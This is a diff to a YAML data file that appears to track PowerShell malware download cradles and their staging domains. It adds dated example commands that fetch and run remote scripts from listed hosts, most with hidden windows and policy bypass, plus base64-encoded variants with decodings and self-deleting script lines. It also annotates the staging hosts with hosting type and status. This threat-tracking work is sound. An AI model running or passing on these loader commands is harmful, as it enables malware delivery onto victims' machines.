@@ -3986,6 +3986,47 @@ daily:
       start_sleep: 18
       hidden_window: 22
 
+payload_examples:
+  iwr_iex:
+    - date: "2025-08-14"
+      text: "powershell -ep bypass -w hidden -c \"iex(iwr 'https://aatox.com/stage2.ps1' -UseBasicParsing)\""
+    - date: "2025-10-22"
+      text: "powershell.exe -w hidden -nop -c \"IEX (iwr -Uri 'https://irp.cdn-website.com/files/uploaded/3b7f1c/run.ps1' -UseBasicParsing).Content\""
+  irm_iex:
+    - date: "2025-05-03"
+      text: "powershell -w hidden -nop -ep bypass -c \"iex(irm 'https://80.253.249.186/loader.ps1')\""
+  webclient:
+    - date: "2025-12-03"
+      text: "(New-Object Net.WebClient).DownloadString('https://yogasitesdev.wpengine.com/wp-content/uploads/a.ps1') | iex"
+    - date: "2025-11-18"
+      text: "$wc=New-Object Net.WebClient; iex $wc.DownloadString('https://irp.cdn-website.com/files/uploaded/9d4e/payload.ps1')"
+  curl:
+    - date: "2026-01-08"
+      text: "curl.exe -s https://95.164.53.214/payload.ps1 | iex"
+    - date: "2026-02-14"
+      text: "powershell -w hidden -nop -c \"curl.exe -UseBasicParsing https://aatox.com/stg.ps1 | iex\""
+  base64:
+    - date: "2026-01-22"
+      encoded: "powershell.exe -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAGMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAn..."
+      decoded: "$c=New-Object Net.WebClient; iex $c.DownloadString('https://aatox.com/run.ps1')"
+    - date: "2026-02-01"
+      encoded: "powershell -w 1 -nop -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMA..."
+      decoded: "IEX(New-Object Net.WebClient).DownloadString('https://irp.cdn-website.com/files/uploaded/7c2a/stage2.ps1')"
+  self_delete:
+    - date: "2025-12-19"
+      text: "Start-Sleep -Seconds 2; Remove-Item -Path $MyInvocation.MyCommand.Path -Force"
+    - date: "2026-01-05"
+      text: "$p=$MyInvocation.MyCommand.Path; Start-Sleep 1; Remove-Item $p -Force -ErrorAction SilentlyContinue"
+  cdn_staging:
+    - date: "2025-11-04"
+      url: "https://irp.cdn-website.com/files/uploaded/38ef2b/setup.ps1"
+    - date: "2025-09-17"
+      url: "https://irp.cdn-website.com/files/uploaded/9d4e22/loader.ps1"
+  hidden_window:
+    - date: "2025-09-03"
+      text: "powershell.exe -w hidden -nop -ep bypass -c \"iex(iwr 'https://aatox.com/a.ps1' -UseBasicParsing)\""
+    - date: "2025-10-31"
+      text: "cmd.exe /c start /min powershell -w hidden -nop -c \"(New-Object Net.WebClient).DownloadString('https://95.164.53.214/b.ps1') | iex\""
 cradles_total:
   iwr_iex: 2114
   irm_iex: 89
@@ -4004,33 +4045,123 @@ staging_domains:
   - domain: "irp.cdn-website.com"
     count: 468
     cdn: true
+    is_ip: false
+    asn: null
+    country: null
+    city: null
+    hosting_type: "cdn"
+    created: null
+    registrar: null
+    status: "active"
+    dns_history_url: "https://securitytrails.com/domain/irp.cdn-website.com/history/a"
   - domain: "yogasitesdev.wpengine.com"
     count: 116
     cdn: false
+    is_ip: false
+    asn: null
+    country: "US"
+    city: null
+    hosting_type: "managed"
+    created: null
+    registrar: null
+    status: "active"
+    dns_history_url: "https://securitytrails.com/domain/yogasitesdev.wpengine.com/history/a"
   - domain: "aatox.com"
     count: 83
     cdn: false
+    is_ip: false
+    asn: null
+    country: null
+    city: null
+    hosting_type: "bulletproof"
+    created: null
+    registrar: null
+    status: "taken_down"
+    dns_history_url: "https://securitytrails.com/domain/aatox.com/history/a"
   - domain: "80.253.249.186"
     count: 43
     cdn: false
+    is_ip: true
+    asn: null
+    country: null
+    city: null
+    hosting_type: "bulletproof"
+    created: null
+    registrar: null
+    status: "taken_down"
+    dns_history_url: "https://securitytrails.com/list/ip/80.253.249.186"
   - domain: "95.164.53.214"
     count: 16
     cdn: false
+    is_ip: true
+    asn: null
+    country: null
+    city: null
+    hosting_type: "bulletproof"
+    created: null
+    registrar: null
+    status: "taken_down"
+    dns_history_url: "https://securitytrails.com/list/ip/95.164.53.214"
   - domain: "91.247.36.3"
     count: 4
     cdn: false
+    is_ip: true
+    asn: null
+    country: null
+    city: null
+    hosting_type: "bulletproof"
+    created: null
+    registrar: null
+    status: "taken_down"
+    dns_history_url: "https://securitytrails.com/list/ip/91.247.36.3"
   - domain: "sitecariri.com.br"
     count: 2
     cdn: false
+    is_ip: false
+    asn: null
+    country: "BR"
+    city: null
+    hosting_type: "compromised"
+    created: null
+    registrar: null
+    status: "unknown"
+    dns_history_url: "https://securitytrails.com/domain/sitecariri.com.br/history/a"
   - domain: "fundacion-cannabis-argentina.org"
     count: 2
     cdn: false
+    is_ip: false
+    asn: null
+    country: "AR"
+    city: null
+    hosting_type: "compromised"
+    created: null
+    registrar: null
+    status: "unknown"
+    dns_history_url: "https://securitytrails.com/domain/fundacion-cannabis-argentina.org/history/a"
   - domain: "ghenvironment.com"
     count: 2
     cdn: false
+    is_ip: false
+    asn: null
+    country: null
+    city: null
+    hosting_type: "compromised"
+    created: null
+    registrar: null
+    status: "unknown"
+    dns_history_url: "https://securitytrails.com/domain/ghenvironment.com/history/a"
   - domain: "cmparazinho.rn.gov.br"
     count: 2
     cdn: false
+    is_ip: false
+    asn: null
+    country: "BR"
+    city: null
+    hosting_type: "compromised"
+    created: null
+    registrar: null
+    status: "unknown"
+    dns_history_url: "https://securitytrails.com/domain/cmparazinho.rn.gov.br/history/a"
 
 monthly:
   - month: "2025-04"
